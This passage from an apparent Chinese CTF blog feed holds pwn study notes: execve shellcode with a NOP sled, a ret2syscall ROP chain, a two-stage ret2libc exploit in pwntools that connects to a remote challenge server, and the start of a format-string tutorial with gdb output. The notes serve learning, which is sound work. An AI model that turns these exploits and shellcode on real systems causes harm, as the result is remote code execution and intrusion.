string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span>payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> nopsled <span class="token operator">+</span> shellcodesh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p><p>因为NX关闭 ，这个题也可以用直接想buf中写入shellcode在用coredump寻找buf地址，转跳该地址来解决</p><p>shellcode集：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP链的简单构造</title>
      <link href="/2020/06/01/rop-lian-de-jian-dan-gou-zao/"/>
      <url>/2020/06/01/rop-lian-de-jian-dan-gou-zao/</url>
      
        <content type="html"><![CDATA[<p><strong><em>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</em></strong></p><pre><code>程序存在溢出，并且可以控制返回地址。可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>首先我们想想如果nx是关闭的我们可以通过构造shellcode放入栈中，再转跳的buf上即可执行我们的shellcode。而打开shell的函数是system（“/bin/sh”）或execve（“/bin/sh”）等。那么问题来了，我们这段ShellCode里面并没有system这个函数，是谁实现了“system(“/bin/sh”)”的效果呢。在网上查了一些资料大致就是：<br>EAX, EBX, ECX, EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，“/bin//sh”字符串入栈，并将其首地址赋给了EBX，最后执行完int 80h</p><p>int指令的功能是调用系统中断，所以int 80h就是调用128号中断，在32位的linux系统中，该中断被用于呼叫系统调用程序system_call( )。我们知道出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。<br>在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read( ), write( )之类的函数从键盘读取输入，把其保存在硬盘里的文件中。那么read( ), write( )之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？<br>答案就在于int 80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的指令int 80h，就可以通知内核完成不同的功能。而read( ), write( ), system( )之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。<br>以下是一个简单的hello world程序</p><pre class=" language-bash"><code class="language-bash">.section .datamsg:        .ascii <span class="token string">"Hello world!\n"</span>.section .text.globl _start_start:        movl <span class="token variable">$4</span>, %eax        movl <span class="token variable">$1</span>, %ebx        movl <span class="token variable">$msg</span>, %ecx        movl <span class="token variable">$13</span>, %edx        int <span class="token variable">$0x80</span>        movl <span class="token variable">$1</span>, %eax        movl <span class="token variable">$0</span>, %ebx        int <span class="token variable">$0x80</span></code></pre><p>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</p><p>我们常用的：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> sys_exitSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token keyword">int</span> status<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> kernel<span class="token operator">/</span>exit<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> terminate the current processDetails<span class="token punctuation">:</span> status is <span class="token keyword">return</span> code<span class="token number">3</span><span class="token punctuation">.</span> sys_readSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> read from a file descriptorDetails<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">.</span> sys_writeSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> write to a file descriptorDetails<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">.</span> sys_execveSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> pt_regs regs<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> arch<span class="token operator">/</span>i386<span class="token operator">/</span>kernel<span class="token operator">/</span>process<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> execute programDetails<span class="token punctuation">:</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p><p>很容易发现ShellCode中的EAX = 0Xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，即执行了sys_execve(“/bin//sh”, 0, 0, 0)，通过/bin/sh软链接打开一个shell，所以我们可以在没有system函数的情况下打开shell。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。</p><p>比如我们像得到shell可以执行这个函数：execve(“/bin/sh”,NULL,NULL)<br>那么：其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><pre class=" language-bash"><code class="language-bash">ROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'eax'</span>  //搜寻pop eax 和retROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'ebx'</span>  //搜寻pop ebx 和retROPgadget --binary rop  --string <span class="token string">'/bin/sh'</span>   //还可以找字符串，那当然也可以找system函数如果有的话ROPgadget --binary rop  --only <span class="token string">'int'</span>   //这个主要找 int 80h这个指令</code></pre><p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p><p>找pop ebx；ret指令<br><img src="https://s1.ax1x.com/2020/06/01/t37CBF.png" alt=""><br>这里我们选倒数第5个：</p><pre class=" language-bash"><code class="language-bash">0x0806eb90 <span class="token keyword">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre><p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p><p>还有/bin/sh字符串<br><img src="https://s1.ax1x.com/2020/06/01/t37SXT.png" alt=""></p><p>万事具备！！<br>构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#0x080bb196 : pop eax ; ret</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span><span class="token comment" spellcheck="true">#0x080be408 : /bin/sh</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span><span class="token comment" spellcheck="true">#0x08049421 : int 0x80</span><span class="token comment" spellcheck="true">#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span>pop_edx_pop_ecx_pop_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_pop_ecx_pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08049421</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"ret2syscall"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p><p>（系统调用功能好可以参考System Call Number Definition<br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#2</a><br>或者 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a> 查找(推荐!)</p><p>启发：<a href="https://zhuanlan.zhihu.com/p/72951960（详细）" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/72951960（详细）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BLOG</title>
      <link href="/2020/05/23/mass/"/>
      <url>/2020/05/23/mass/</url>
      
        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析got，plt，libc</title>
      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
      
        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.126.19.106"</span><span class="token punctuation">,</span><span class="token number">52825</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process("level3")</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"level3"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc_32.so.6"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#write函数的plt地址</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#write函数的got地址，该地址存放write真实地址</span>main_addr <span class="token operator">=</span> <span class="token number">0x08048484</span> <span class="token comment" spellcheck="true">#main函数地址可以从ida直接看，也可以elf.symbols['main']搜索</span><span class="token comment" spellcheck="true">#print write_plt     </span><span class="token comment" spellcheck="true">#print write_got</span><span class="token comment" spellcheck="true">#print main_addr</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</span><span class="token comment" spellcheck="true">#p.recv()</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#sh.recv(4)是接受4个字节的输出，u32和p32功能相反</span><span class="token comment" spellcheck="true">#print write_addr</span>libc_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#减去了write的offset</span><span class="token comment" spellcheck="true">#print(hex(libc_addr))</span><span class="token comment" spellcheck="true">#print "libc"+hex(libc_addr)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#得到binsh真实地址</span><span class="token comment" spellcheck="true">#print "binsh_addr => "+hex(binsh_addr)</span>sys_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#得到system真实地址</span><span class="token keyword">print</span> <span class="token string">"sys_addr => "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#通过上次攻击返回地址位vulnerable函数可以再次攻击</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="函数"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：</p><pre class=" language-bash"><code class="language-bash">%08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xff9645f0.f7ee9410.0804849d</code></pre><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ rStarting program: /home/hunter/PWN/formal/wiki/test1 %08x.%08x.%08x  //我们还是输入%08x.%08x.%08x回车继续运行，程序停在第一次调用printf处：<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:        call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:        sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    <span class="token punctuation">)</span>   //printf函数的返回地址0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> printf函数第一个参数即格式化字符串0008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1   //变量a的地址 （格式化字符串的第一个参数）0012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x"</span><span class="token punctuation">)</span>    //变量b，我不知道为啥是这么一大串，理论上是0x222222220016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //变量c0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>  该变量是我们输入的格式化字符串对应的地址 0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span>    <span class="token punctuation">(</span><span class="token punctuation">)</span> from /lib32/libc.so.6gdb-peda$ 继续执行：gdb-peda$ cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x程序确实输出了每一个变量对应的数值，并停在第二个printf<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token 